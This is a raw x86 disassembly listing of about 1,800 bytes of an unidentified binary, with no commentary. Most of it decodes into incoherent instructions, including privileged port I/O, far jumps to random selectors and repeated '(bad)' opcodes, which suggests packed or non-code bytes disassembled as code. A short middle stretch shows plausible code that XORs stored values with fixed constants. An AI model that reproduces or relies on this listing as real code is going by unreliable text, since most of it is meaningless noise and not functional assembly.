  420ac0:	add    BYTE PTR [edi+0x3f],dh
  420ac3:	call   0xf17a:0xd8051da1
  420aca:	xor    al,0xda
  420acc:	jae    0x420a77
  420ace:	sbb    edx,DWORD PTR [edx]
  420ad0:	add    eax,0x98d08501
  420ad5:	sub    DWORD PTR [ebp+0x346143c2],edi
  420adb:	les    ebx,FWORD PTR [ecx-0x7c2b67f6]
  420ae1:	arpl   WORD PTR [esi-0x41828958],ax
  420ae7:	call   0xbbe62c4c
  420aec:	rol    cl,cl
  420aee:	je     0x420a90
  420af0:	xrelease xchg DWORD PTR [edi],edx
  420af3:	and    ch,BYTE PTR [esi]
  420af5:	popa   
  420af6:	dec    ecx
  420af7:	mov    esi,0x5fefea7a
  420afc:	pusha  
  420afd:	adc    eax,0x4d51e507
  420b02:	dec    eax
  420b03:	mov    edi,0x543ec492
  420b08:	mov    eax,ds:0xa26f2345
  420b0d:	addr16 or edx,ebx
  420b10:	ficom  WORD PTR [edx-0xd]
  420b13:	leave  
  420b14:	mov    dh,0xa8
  420b16:	test   eax,0x6fcc907a
  420b1b:	lea    edx,[esi-0x26]
  420b1e:	jecxz  0x420b5a
  420b20:	fsub   QWORD PTR [edx+ebp*8-0x59a90f55]
  420b27:	neg    BYTE PTR [edi-0x6]
  420b2a:	xor    ch,ch
  420b2c:	enter  0x6a96,0x61
  420b30:	call   0x1c023744
  420b35:	xor    ch,BYTE PTR [esi-0x4c614bef]
  420b3b:	add    al,BYTE PTR [ecx+ebx*4-0x13]
  420b3f:	in     al,dx
  420b40:	mov    al,0x2b
  420b42:	scas   al,BYTE PTR es:[edi]
  420b43:	dec    ecx
  420b44:	icebp  
  420b45:	mov    ebp,0xe8a9d4f
  420b4a:	imul   edx,DWORD PTR gs:[eax+0x5e],0x48
  420b4f:	loope  0x420b02
  420b51:	push   DWORD PTR [ecx-0x61]
  420b54:	jp     0x420b2b
  420b56:	imul   DWORD PTR [esi+0x5f]
  420b59:	cmp    cl,BYTE PTR [eax+eiz*8]
  420b5c:	sub    ebp,eax
  420b5e:	inc    eax
  420b5f:	mov    esp,0x8c1e5643
  420b64:	xchg   edx,eax
  420b65:	das    
  420b66:	dec    esp
  420b67:	add    al,0x4a
  420b69:	(bad)  
  420b6b:	lds    ecx,FWORD PTR [ecx+edx*8]
  420b6e:	push   esp
  420b6f:	jp     0x420b1d
  420b71:	stos   DWORD PTR es:[edi],eax
  420b72:	inc    ebx
  420b73:	outs   dx,DWORD PTR ds:[esi]
  420b74:	adc    al,0x43
  420b76:	xor    bl,cl
  420b78:	in     al,0x3d
  420b7a:	or     DWORD PTR [edx],edi
  420b7c:	add    DWORD PTR [ebx-0xe77b],ecx
  420b82:	dec    DWORD PTR [ebx-0x14373]
  420b88:	(bad)  
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [edx+eax*8+0x8dd706a],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0x6
  420ba7:	dec    esp
  420ba8:	jg     0x420b34
  420baa:	inc    esi
  420bab:	mov    ds:0xbd7e41d,al
  420bb0:	dec    eax
  420bb1:	pop    ds
  420bb2:	xor    al,0xb4
  420bb4:	add    eax,0x9b637695
  420bb9:	ret    0xfec6
  420bbc:	xor    esp,DWORD PTR [ecx-0x85d4808]
  420bc2:	repz jle 0x420c11
  420bc5:	ret    
  420bc6:	sub    al,0x8
  420bc8:	stc    
  420bc9:	push   esi
  420bca:	xor    eax,0xc6ada7e
  420bcf:	(bad)  
  420bd0:	aaa    
  420bd1:	das    
  420bd2:	and    al,0xe0
  420bd4:	call   FWORD PTR [ecx]
  420bd6:	fstp   TBYTE PTR [ebx-0x1f]
  420bd9:	int    0x9d
  420bdb:	mov    ch,0xca
  420bdd:	addr16 (bad) 
  420bdf:	das    
  420be0:	das    
  420be1:	cwde   
  420be2:	neg    DWORD PTR [ecx-0x67]
  420be5:	out    0x14,eax
  420be7:	cmp    BYTE PTR [edx+0x60787a26],dl
  420bed:	add    BYTE PTR ds:0xc71ac61d,ah
  420bf3:	mov    DWORD PTR [ecx+ebx*1],ecx
  420bf6:	xchg   ebx,eax
  420bf7:	sbb    DWORD PTR [eax+0x5f],esp
  420bfa:	(bad)  
  420bfb:	and    eax,0x976bbeb6
  420c00:	mov    esi,0xbaf31dd7
  420c05:	mov    ds,WORD PTR [ebx+ebp*8-0x7872e1d0]
  420c0c:	ja     0x420c45
  420c0e:	test   BYTE PTR [edi-0x2a78e576],bl
  420c14:	into   
  420c15:	mov    al,0xa2
  420c17:	and    al,BYTE PTR [esi+0x2e]
  420c1a:	ins    DWORD PTR es:[edi],dx
  420c1b:	mov    ds:0xa8f3c182,eax
  420c20:	xchg   ecx,eax
  420c21:	fcomp  QWORD PTR [ecx+0x5e93b547]
  420c27:	lods   al,BYTE PTR ds:[esi]
  420c28:	lock fucomi st,st(2)
  420c2b:	or     DWORD PTR [ebp-0x228fb155],eax
  420c31:	out    0x49,al
  420c33:	stos   BYTE PTR es:[edi],al
  420c34:	inc    esi
  420c35:	clc    
  420c36:	std    
  420c37:	push   esp
  420c38:	out    0xc2,al
  420c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3c:	mov    WORD PTR [esi],gs
  420c3e:	add    DWORD PTR [ebx+0x3ed0bbc5],0x7ec81089
  420c48:	xchg   ebp,eax
  420c49:	fwait
  420c4a:	jbe    0x420c8d
  420c4c:	mov    gs,edx
  420c4e:	dec    ecx
  420c4f:	jno    0x420c9b
  420c51:	push   es
  420c52:	dec    eax
  420c53:	out    dx,al
  420c54:	scas   eax,DWORD PTR es:[edi]
  420c55:	jl     0x420cb5
  420c57:	in     al,dx
  420c58:	jb     0x420c5d
  420c5a:	sub    dl,BYTE PTR [eax+edi*1-0x29]
  420c5e:	xchg   ebx,eax
  420c5f:	sbb    eax,0x28f0594
  420c64:	dec    ebp
  420c65:	jmp    FWORD PTR [eax+eax*2-0x4d8bff48]
  420c6c:	les    ecx,FWORD PTR [ebp-0x13c87499]
  420c72:	adc    BYTE PTR [eax+esi*2+0x102696bd],dl
  420c79:	and    DWORD PTR ds:[esi+0x72],edi
  420c7d:	or     DWORD PTR [esp+esi*4],edx
  420c80:	or     al,0xd1
  420c82:	into   
  420c83:	aaa    
  420c84:	es cmp edi,esi
  420c87:	inc    esi
  420c88:	push   es
  420c89:	jle    0x420ce1
  420c8b:	jnp    0x420cea
  420c8d:	jl     0x420c3d
  420c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c90:	push   ebx
  420c91:	mov    eax,ds:0xe9bae3cc
  420c96:	inc    edx
  420c97:	xchg   edx,eax
  420c98:	test   DWORD PTR ds:0x836c45b9,eax
  420c9e:	cwde   
  420c9f:	push   0xffffffc4
  420ca1:	push   esp
  420ca2:	in     al,dx
  420ca3:	outs   dx,DWORD PTR ds:[esi]
  420ca4:	outs   dx,BYTE PTR ds:[esi]
  420ca5:	pusha  
  420ca6:	test   eax,0x8bc49106
  420cab:	xor    ebp,DWORD PTR [edx-0x4cbdd5dc]
  420cb1:	sbb    eax,ebx
  420cb3:	mov    cs,WORD PTR [esi-0x712aa2a5]
  420cb9:	cwde   
  420cba:	sbb    eax,0xc2cf7255
  420cbf:	dec    ecx
  420cc0:	dec    edi
  420cc1:	sub    DWORD PTR [edi],esp
  420cc3:	cli    
  420cc4:	pop    ds
  420cc5:	push   ss
  420cc6:	push   es
  420cc7:	push   0x7e
  420cc9:	jmp    0x7314:0x11306370
  420cd0:	sbb    cl,ch
  420cd2:	bound  esp,QWORD PTR [edx-0x30dce8c9]
  420cd8:	xchg   esp,eax
  420cd9:	scas   eax,DWORD PTR es:[edi]
  420cda:	mov    al,0xc3
  420cdc:	loopne 0x420cf8
  420cde:	add    DWORD PTR [esi+0x63],ecx
  420ce1:	inc    cl
  420ce3:	(bad)  
  420ce4:	cmp    BYTE PTR [edx-0x28],al
  420ce7:	sub    al,0xd4
  420ce9:	icebp  
  420cea:	out    dx,al
  420ceb:	fild   QWORD PTR [eax-0x58]
  420cee:	xchg   ebx,eax
  420cef:	adc    al,0x30
  420cf1:	inc    ebp
  420cf2:	fwait
  420cf3:	test   DWORD PTR [eax+ebx*4],eax
  420cf6:	aam    0xa1
  420cf8:	mov    bh,0x5b
  420cfa:	cdq    
  420cfb:	popf   
  420cfc:	or     DWORD PTR [edi],esp
  420cfe:	retf   0x24e9
  420d01:	out    dx,eax
  420d02:	cmp    DWORD PTR [esi],edi
  420d04:	or     ah,BYTE PTR [ecx-0x79]
  420d07:	add    eax,DWORD PTR [esi+0x49]
  420d0a:	xchg   esi,eax
  420d0b:	lea    edi,[esi+0x14]
  420d0e:	imul   eax,esp,0x56aa3c0d
  420d14:	pop    edi
  420d15:	outs   dx,BYTE PTR ds:[esi]
  420d16:	mov    ebp,0xfe47dc68
  420d1b:	cmp    ecx,0x3a
  420d1e:	jne    0x420d8a
  420d20:	pushf  
  420d21:	fidiv  WORD PTR ds:0xd9b313ee
  420d27:	sti    
  420d28:	and    DWORD PTR [esi-0x7bd5ee86],edx
  420d2e:	clc    
  420d2f:	test   dh,ch
  420d31:	sbb    DWORD PTR [ebx+ecx*1+0x19a6ce7a],esi
  420d38:	lock xchg DWORD PTR [ebx+0x54241e0],edi
  420d3f:	ins    BYTE PTR es:[edi],dx
  420d40:	sub    eax,0x3fa1b9e9
  420d45:	push   ds
  420d46:	mov    al,0x45
  420d48:	jbe    0x420d51
  420d4a:	pop    ecx
  420d4b:	mov    ds:0x80e48146,eax
  420d50:	scas   eax,DWORD PTR es:[edi]
  420d51:	xchg   edi,eax
  420d52:	aam    0x3
  420d54:	ret    
  420d55:	mov    bh,0xda
  420d57:	lods   al,BYTE PTR ds:[esi]
  420d58:	das    
  420d59:	jge    0x420d5a
  420d5b:	xor    dl,0xd1
  420d5e:	sbb    eax,DWORD PTR [ebp-0x26]
  420d61:	shr    BYTE PTR [edx],cl
  420d63:	add    eax,0x8a6361fa
  420d68:	or     eax,0xdf146937
  420d6d:	jge    0x420dc1
  420d6f:	rcr    BYTE PTR [edi+0x39068f25],0x73
  420d76:	xchg   ebx,eax
  420d77:	and    eax,0xa75581c6
  420d7c:	pop    ebx
  420d7d:	test   al,0xff
  420d7f:	mov    ebx,0x9ec0e482
  420d84:	(bad)  [edx+0xfdf4a92]
  420d8a:	push   es
  420d8b:	inc    ebp
  420d8c:	and    ebp,0xffffffbc
  420d8f:	mov    ah,0xeb
  420d91:	mov    esp,gs
  420d93:	jns    0x420d15
  420d95:	or     bl,BYTE PTR [eax]
  420d97:	inc    ecx
  420d98:	mov    ecx,0xa419ccfe
  420d9d:	jo     0x420e19
  420d9f:	std    
  420da0:	in     al,dx
  420da1:	adc    ah,al
  420da3:	les    esi,FWORD PTR [ecx]
  420da5:	jne    0x420d77
  420da7:	cmp    BYTE PTR [ebx+ebx*2-0x42],dl
  420dab:	lods   eax,DWORD PTR ds:[esi]
  420dac:	add    ebp,eax
  420dae:	pop    esi
  420daf:	mov    dl,0x38
  420db1:	add    al,0xe5
  420db3:	hlt    
  420db4:	(bad)  
  420db5:	jnp    0x420df4
  420db7:	leave  
  420db8:	jbe    0x420d51
  420dba:	pop    ebp
  420dbb:	sahf   
  420dbc:	xchg   ebx,eax
  420dbd:	mov    WORD PTR [ebx],es
  420dbf:	mov    eax,ds:0xeb4402b1
  420dc4:	xor    DWORD PTR [edx-0x6430f585],ebx
  420dca:	dec    esi
  420dcb:	push   0x17118e60
  420dd0:	push   ss
  420dd1:	pop    es
  420dd2:	push   0x35
  420dd4:	int    0x64
  420dd6:	dec    ecx
  420dd7:	(bad)  
  420dd8:	out    0xb0,al
  420dda:	push   edx
  420ddb:	pop    es
  420ddc:	clc    
  420ddd:	call   0xfea928c2
  420de2:	daa    
  420de3:	lock jno 0x420daf
  420de6:	pop    ecx
  420de7:	out    dx,eax
  420de8:	dec    esp
  420de9:	(bad)  
  420dea:	mov    dh,0xef
  420dec:	stos   BYTE PTR es:[edi],al
  420ded:	jmp    0x9f5a4f08
  420df2:	call   0x4684:0xf9bcd4ad
  420df9:	out    0xcf,al
  420dfb:	adc    al,0x49
  420dfd:	dec    edi
  420dfe:	inc    eax
  420dff:	ja     0x420df4
  420e01:	xor    eax,0xc103ef76
  420e06:	xor    BYTE PTR [ebx+0x15],al
  420e09:	sbb    DWORD PTR [esi+0x4228abb2],ecx
  420e0f:	clc    
  420e10:	dec    esp
  420e11:	iret   
  420e12:	aas    
  420e13:	jecxz  0x420e93
  420e15:	lea    edx,[ecx+0x24]
  420e18:	call   0xbe61:0xebdee05f
  420e1f:	cdq    
  420e20:	mov    eax,0xb3f7a0d
  420e25:	or     al,0x32
  420e27:	mov    ebp,0x5b8d4076
  420e2c:	inc    esi
  420e2d:	mov    ds:0xa11ccb01,eax
  420e32:	fsubr  DWORD PTR [ecx]
  420e34:	in     al,0xde
  420e36:	mov    es,WORD PTR ds:[eax+0x160634bc]
  420e3d:	push   ds
  420e3e:	jmp    0x1344:0x8745a123
  420e45:	xchg   edi,eax
  420e46:	outs   dx,DWORD PTR ds:[esi]
  420e47:	push   es
  420e48:	jecxz  0x420ddf
  420e4a:	inc    edi
  420e4b:	ret    
  420e4c:	mov    ds:0x4f1ace82,al
  420e51:	push   ds
  420e52:	xlat   BYTE PTR ds:[ebx]
  420e53:	sti    
  420e54:	lods   al,BYTE PTR ds:[esi]
  420e55:	xor    eax,0x2bcd0548
  420e5a:	je     0x420e77
  420e5c:	mov    dh,0x27
  420e5e:	sbb    ch,BYTE PTR [esi]
  420e60:	xchg   edi,eax
  420e61:	mov    esp,0x8b65bbf6
  420e66:	push   0xffffffbe
  420e68:	(bad)  
  420e69:	mov    al,ds:0xf73887c7
  420e6e:	or     BYTE PTR [esi+esi*8],ah
  420e71:	idiv   al
  420e73:	stos   DWORD PTR es:[edi],eax
  420e74:	mov    ah,0x90
  420e76:	adc    ch,al
  420e78:	sti    
  420e79:	cmp    BYTE PTR [esi-0x2ceaa9d5],dh
  420e7f:	dec    edx
  420e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e81:	mov    ebx,0x4bb501a4
  420e86:	pop    ecx
  420e87:	sub    edx,DWORD PTR [edx+0x7745f7e]
  420e8d:	mov    WORD PTR [edi-0x72],?
  420e90:	scas   al,BYTE PTR es:[edi]
  420e91:	imul   ecx,DWORD PTR [ecx],0x4fb41849
  420e97:	stos   BYTE PTR es:[edi],al
  420e98:	lods   eax,DWORD PTR ds:[esi]
  420e99:	mov    ds:0xc2b5a62d,al
  420e9e:	sub    ebp,DWORD PTR [edi+eax*8-0x41]
  420ea2:	mov    ah,0xf6
  420ea4:	stc    
  420ea5:	bound  ebx,QWORD PTR ds:[edx]
  420ea8:	sub    edi,DWORD PTR [ecx+0x1f95a494]
  420eae:	push   ebx
  420eaf:	sti    
  420eb0:	ret    
  420eb1:	sbb    esp,ecx
  420eb3:	pop    edi
  420eb4:	fcmovnu st,st(3)
  420eb6:	push   0x24
  420eb8:	sti    
  420eb9:	push   edx
  420eba:	pop    edx
  420ebb:	sbb    bl,BYTE PTR [edi]
  420ebd:	add    bl,BYTE PTR [edx-0x1d]
  420ec0:	pop    edx
  420ec1:	call   0x64421f2e
  420ec6:	arpl   WORD PTR es:[ecx-0x57],dx
  420eca:	(bad)  
  420ecb:	cli    
  420ecc:	loope  0x420ead
  420ece:	adc    al,BYTE PTR [ebp+0xf9fd022]
  420ed4:	sahf   
  420ed5:	sbb    esp,esp
  420ed7:	out    0x40,eax
  420ed9:	fadd   DWORD PTR [ecx]
  420edb:	add    DWORD PTR [ecx+ebp*4+0x3a7cac5e],esp
  420ee2:	adc    eax,0xc373b521
  420ee7:	inc    ecx
  420ee8:	fstp   DWORD PTR [ecx-0x5a]
  420eeb:	fmul   DWORD PTR [edx]
  420eed:	push   0xffffffe1
  420eef:	mov    esp,0xcc60b186
  420ef4:	fwait
  420ef5:	cmp    BYTE PTR [eax-0x40],0x37
  420ef9:	(bad)  
  420efa:	call   0xa984bf0f
  420eff:	or     dh,BYTE PTR [ebp+0x6c]
  420f02:	inc    ebx
  420f03:	out    0x4,eax
  420f05:	or     eax,0xf6c5d844
  420f0a:	add    esp,DWORD PTR [ebx]
  420f0c:	jno    0x420f81
  420f0e:	pop    edi
  420f0f:	loopne 0x420ea8
  420f11:	sbb    al,BYTE PTR [ebx]
  420f13:	sub    eax,0x94aa81a
  420f18:	mov    bl,0xcd
  420f1a:	pop    edx
  420f1b:	cmp    al,0x67
  420f1d:	jne    0x420eb0
  420f1f:	lahf   
  420f20:	retf   
  420f21:	dec    esi
  420f22:	or     eax,0x5ac2e41c
  420f27:	mov    ch,0xc0
  420f29:	imul   bh
  420f2b:	xchg   DWORD PTR [ecx],eax
  420f2d:	fs push ebx
  420f2f:	push   esi
  420f30:	xlat   BYTE PTR ds:[ebx]
  420f31:	push   0x59a34522
  420f36:	mov    eax,ds:0x5f5e6ff8
  420f3b:	push   edx
  420f3c:	fstp   DWORD PTR [ebx+0x65]
  420f3f:	dec    ebx
  420f40:	test   edx,esp
  420f42:	shl    esi,0xc6
  420f45:	pop    ss
  420f46:	xchg   edi,eax
  420f47:	out    0x23,eax
  420f49:	push   ds
  420f4a:	mov    BYTE PTR [ecx+0x5e],ch
  420f4d:	cli    
  420f4e:	sub    esi,esi
  420f50:	pop    edx
  420f51:	in     al,dx
  420f52:	int3   
  420f53:	arpl   WORD PTR [esi-0x693c9567],bp
  420f59:	push   ebp
  420f5a:	jge    0x420fa8
  420f5c:	sub    ch,BYTE PTR [edi+0x7b]
  420f5f:	push   0x32
  420f61:	push   cs
  420f62:	inc    esi
  420f63:	mov    ecx,DWORD PTR [edx+ecx*1]
  420f66:	arpl   WORD PTR [eax+esi*8-0x5f],si
  420f6a:	or     al,0x2d
  420f6c:	retf   
  420f6d:	jl     0x420fad
  420f6f:	jb     0x420fac
  420f71:	dec    eax
  420f72:	sbb    BYTE PTR [edi],cl
  420f74:	test   BYTE PTR [edx+edx*1+0x0],al
  420f78:	add    BYTE PTR [ebx-0x1437b],cl
  420f7e:	dec    DWORD PTR [ebx+0x558bc84d]
  420f84:	or     BYTE PTR [ebx],al
  420f86:	adc    al,0x81
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	nop
  42104d:	call   0xbec0:0xb393d168
  421054:	dec    edx
  421055:	les    edi,FWORD PTR [esi+0x5f05cebe]
  42105b:	fstp   DWORD PTR [edi+0x2e]
  42105e:	in     al,dx
  42105f:	rcr    ebx,cl
  421061:	popf   
  421062:	sbb    ch,BYTE PTR [eax-0x51]
  421065:	psubd  mm2,QWORD PTR [ebx]
  421068:	dec    edi
  421069:	into   
  42106a:	in     al,0xa8
  42106c:	push   ds
  42106d:	mov    dh,0x10
  42106f:	cmc    
  421070:	dec    ebx
  421071:	inc    eax
  421072:	and    eax,DWORD PTR [esi+0x7]
  421075:	ss sbb al,0x92
  421078:	pop    ds
  421079:	fsub   DWORD PTR [ebp-0x24]
  42107c:	aaa    
  42107d:	(bad)  
  42107e:	ficomp DWORD PTR [ebp+ebp*1-0x53ff2bd]
  421085:	mov    edi,0x62366f15
  42108a:	sbb    eax,0x5e519884
  42108f:	push   ebp
  421090:	mov    esp,0x1c7fcc85
  421095:	sub    al,0xda
  421097:	jns    0x421055
  421099:	rcl    esi,1
  42109b:	mov    eax,0xcbc63185
  4210a0:	ds dec eax
  4210a2:	jnp    0x4210e8
  4210a4:	add    eax,edx
  4210a6:	pop    ds
  4210a7:	inc    ecx
  4210a8:	(bad)  
  4210a9:	sbb    al,0x65
  4210ab:	add    al,0x6b
  4210ad:	lahf   
  4210ae:	popf   
  4210af:	push   ebp
  4210b0:	xchg   esp,eax
  4210b1:	enter  0x21f1,0x52
  4210b5:	mov    bl,0x5f
  4210b7:	cwde   
  4210b8:	jb     0x4210ee
  4210ba:	daa    
  4210bb:	mov    dl,0x3f
  4210bd:	dec    edi
  4210be:	pop    es
  4210bf:	inc    edi
  4210c0:	mov    al,ds:0x4a23af53
  4210c5:	xor    BYTE PTR [edi],bh
  4210c7:	xchg   edx,eax
  4210c8:	call   DWORD PTR [esi+ecx*8+0x3594bbf5]
  4210cf:	and    eax,0x9e3ff935
  4210d4:	leave  
  4210d5:	xor    DWORD PTR [eax],0xffffffd5
  4210d8:	dec    ebx
  4210d9:	fs mov ah,0x4e
  4210dc:	jle    0x4210dd
  4210de:	outs   dx,BYTE PTR ds:[esi]
  4210df:	inc    ebx
  4210e0:	setbe  bl
  4210e3:	cld    
  4210e4:	(bad)  
  4210e5:	mov    cl,al
  4210e7:	or     esi,DWORD PTR [edi+0x7e3d2e54]
  4210ed:	xor    eax,0x5f5c3972
  4210f2:	es or  dl,cl
  4210f5:	jmp    0x4210fc
  4210f7:	or     al,0x91
  4210f9:	mov    esp,0x40fefb33
  4210fe:	and    al,0x59
  421100:	fsubr  QWORD PTR [esi]
  421102:	loope  0x421154
  421104:	lds    esi,FWORD PTR [eax+ebp*4]
  421107:	xlat   BYTE PTR ds:[ebx]
  421108:	jne    0x421168
  42110a:	scas   eax,DWORD PTR es:[edi]
  42110b:	cmp    eax,esp
  42110d:	and    ebp,DWORD PTR [ecx+0x187f0164]
  421113:	or     al,0xbb
  421115:	adc    BYTE PTR [esi+0xe45e006],bl
  42111b:	dec    esi
  42111c:	int    0xcf
  42111e:	into   
  42111f:	icebp  
  421120:	jle    0x4210cd
  421122:	jbe    0x421150
  421124:	(bad)  
  421125:	mov    ds:0x40e28c9e,eax
  42112a:	push   ebx
  42112b:	sub    dh,BYTE PTR [edx-0x1c]
  42112e:	mov    bh,0x5
  421130:	ret    
  421131:	out    0x87,eax
  421133:	xchg   esp,eax
  421134:	cs mov ch,0xf3
  421137:	mov    bh,0xec
  421139:	out    0x29,al
  42113b:	xor    eax,0x36a03bc1
  421140:	xchg   esi,eax
  421141:	add    BYTE PTR [esi-0x6b],ah
  421144:	push   eax
  421145:	out    0xf9,al
  421147:	xor    al,0xb6
  421149:	out    0xf1,al
  42114b:	dec    dh
  42114d:	mov    esp,0x4cfc507e
  421152:	out    0x6e,eax
  421154:	iret   
  421155:	xchg   edx,eax
  421156:	pop    es
  421157:	in     eax,dx
  421158:	xchg   ecx,eax
  421159:	mov    ebp,0x39186f4f
  42115e:	sub    ebp,DWORD PTR [edi+0x8df7dc]
  421164:	into   
  421165:	pop    esp
  421166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421167:	xor    esi,ecx
  421169:	adc    al,0x5a
  42116b:	int    0xa3
  42116d:	fsubrp st(3),st
  42116f:	xchg   ecx,eax
  421170:	or     al,0x1d
  421172:	outs   dx,DWORD PTR ds:[esi]
  421173:	cmp    DWORD PTR [edx+0x7c11f004],ecx
  421179:	inc    ebx
  42117a:	out    0x34,al
  42117c:	ins    DWORD PTR es:[edi],dx
  42117d:	mov    dl,0xda
  42117f:	test   BYTE PTR [edi],dh
  421181:	sbb    DWORD PTR [ebx],0x3c228452
  421187:	xchg   ebp,eax
  421188:	pop    ss
  421189:	add    BYTE PTR ss:[ebp-0x6b],cl
  42118d:	add    ch,dl
  42118f:	aad    0x33
  421191:	adc    BYTE PTR [esi+0x483e02d9],ch
  421197:	mov    WORD PTR [ecx+ecx*8-0x70c23b12],0x868e
  4211a1:	(bad)  
  4211a3:	(bad)  
  4211a4:	stos   BYTE PTR es:[edi],al
  4211a5:	cld    
  4211a6:	mov    ecx,0x8c9a1ff5
  4211ab:	jmp    0x7f55:0x8ad533a5
  4211b2:	mov    bh,0xc8
  4211b4:	and    DWORD PTR [edi],0x2bd41592
  4211ba:	jns    0x421205
  4211bc:	cmp    al,0x1
  4211be:	nop
  4211bf:	adc    eax,0x3496551e
  4211c4:	xor    bh,bl
  4211c6:	ja     0x4211b1
  4211c8:	in     eax,0x1c
  4211ca:	pop    ebx
  4211cb:	scas   al,BYTE PTR es:[edi]
  4211cc:	mov    cl,0xf7
  4211ce:	rol    DWORD PTR [eax+0xc],0x3f
  4211d2:	or     al,0x3d
  4211d4:	aas    
  4211d5:	aam    0x33
  4211d7:	cmp    eax,0x58aadd59
  4211dc:	scas   al,BYTE PTR es:[edi]
  4211dd:	mov    al,0xc0
  4211df:	xor    eax,0xfc8eac47
  4211e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e5:	loopne 0x4211a5
  4211e7:	(bad)
  4211ec:	icebp  
  4211ed:	adc    DWORD PTR [ebp-0x14],ebx
  4211f0:	inc    ebp
  4211f1:	pop    edi
  4211f2:	cmp    ecx,DWORD PTR ds:0x83a5f680
  4211f8:	iret   
  4211f9:	mov    edx,0xa023169f
  4211fe:	jno    0x42122f
  421200:	call   0x5f09:0xcb0ae2d8
  421207:	int    0x45
  421209:	push   edx
  42120a:	inc    edi
  42120b:	leave  
  42120c:	adc    DWORD PTR [ebx-0x61ce2ec1],edi
  421212:	push   cs
  421213:	mov    DWORD PTR [ebp+0x5e8e76f5],ecx
  421219:	mov    dh,0x77
  42121b:	inc    ebp
  42121c:	fstp   QWORD PTR [ecx+0x16]
  42121f:	(bad)  
  421220:	xor    eax,0xe420f83d
  421225:	cs ds ret 
  421228:	mov    BYTE PTR [ebx+esi*1+0x4c607864],dl
  42122f:	dec    ebx
  421230:	ror    DWORD PTR [esi-0x39],cl
  421233:	pop    esp
  421234:	jecxz  0x4212b1
  421236:	or     eax,0xad4b37e9
  42123b:	repz jmp 0x7eb5810d
  421241:	xchg   ebp,eax
  421242:	adc    DWORD PTR [ebx+0x5e],ebp
  421245:	stc    
  421246:	shr    BYTE PTR [eax+0x541807b4],1
  42124c:	js     0xe52d4232
  421252:	xor    edi,ebx
  421254:	lods   eax,DWORD PTR ds:[esi]
  421255:	out    0xe2,eax
  421257:	and    DWORD PTR [ecx],ebp
  421259:	(bad)  
  42125a:	out    dx,eax
  42125b:	sub    edx,DWORD PTR [ebp-0x9967ec5]
  421261:	repz xchg ebp,eax
  421264:	mov    es,ebx
  421266:	xor    DWORD PTR [esi-0x40],esi
  421269:	dec    ecx
  42126a:	cli    
  42126b:	lahf   
  42126c:	out    dx,eax
  42126d:	jae    0x42121f
  42126f:	cmp    edx,DWORD PTR [esi]
  421271:	sub    esp,0x40
  421274:	test   esi,edx
  421276:	adc    bl,bh
  421278:	add    al,bl
  42127a:	je     0x42127d
  42127c:	push   es
  42127d:	bsf    edx,DWORD PTR [esi]
  421280:	fcmovne st,st(4)
  421282:	int3   
  421283:	or     DWORD PTR [edi+0x2a702540],ebx
  421289:	es out dx,eax
  42128b:	pop    edi
  42128c:	jp     0x421277
  42128e:	ret    
  42128f:	xchg   edi,edx
  421291:	arpl   sp,bx
  421293:	and    al,0x8b
  421295:	cmp    cl,dl
  421297:	push   ecx
  421298:	(bad)  
  421299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42129a:	add    BYTE PTR [esi],bh
  42129c:	push   esp
  42129d:	ins    DWORD PTR es:[edi],dx
  42129e:	and    eax,0x4998f583
  4212a3:	ret    
  4212a4:	imul   ebx,DWORD PTR [eax-0x65],0x2e
  4212a8:	mov    DWORD PTR [ebx+0x5f6f851e],esi
  4212ae:	pushf  
  4212af:	int3   
  4212b0:	add    BYTE PTR [ecx+ebp*1-0x28],cl
  4212b4:	mov    esp,0x2bd026c7
  4212b9:	dec    ebx
  4212ba:	sti    
  4212bb:	mov    ebx,0xc960978f
  4212c0:	mov    ds:0xf45767eb,eax
  4212c5:	push   eax
  4212c6:	mov    dh,0xf3
  4212c8:	int3   
  4212c9:	rcr    ebx,0x47
